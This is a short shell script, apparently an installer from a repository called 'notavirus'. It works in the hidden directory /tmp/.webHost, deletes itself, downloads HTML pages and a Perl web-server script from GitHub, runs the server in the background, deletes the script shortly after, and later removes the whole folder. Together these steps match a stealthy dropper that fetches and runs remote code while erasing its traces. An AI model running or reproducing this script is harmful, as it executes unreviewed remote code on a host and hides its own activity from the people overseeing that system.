
cd /tmp/.webHost

#Delete installer (this script)
rm installer.sh

#Download html
curl https://raw.githubusercontent.com/pointfour/notavirus/master/hi.html > hi.html

curl https://raw.githubusercontent.com/pointfour/notavirus/master/running_command.html > running_command.html

curl https://raw.githubusercontent.com/pointfour/notavirus/master/browser.ico > browser.ico

#Download scripts
curl https://raw.githubusercontent.com/pointfour/notavirus/master/perlWebHost.pl > perlWebHost.pl
chmod u+x perlWebHost.pl

#Start webhost
perl perlWebHost.pl &

sleep 10

#Delete perl script
rm perlWebHost.pl

sleep 1440

#Delet the whole folder (html will be unavailable)

cd ..
rm -rf .webHost

sleep 1440
